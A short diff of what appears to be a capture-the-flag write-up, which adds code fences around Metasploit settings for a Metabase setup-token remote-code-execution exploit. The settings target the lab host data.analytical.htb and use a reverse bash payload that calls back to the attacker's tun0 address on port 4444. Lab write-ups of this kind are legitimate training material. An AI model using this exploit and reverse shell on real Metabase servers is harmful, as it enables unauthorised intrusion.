@@ -32,14 +32,17 @@ search Metabase
 use 0
 ```
 
+```
 Module options(exploit/linux/http/metabase_setup_token_rce):
 RHOSTS     data.analytical.htb  
 RPORT      80
 TARGETURI  / 
-
+```
+```
 Payload options(cmd/unix/reverse_bash):
 LHOST  tun0
 LPORT  4444
+```
 
 ## User SSHlogin
 
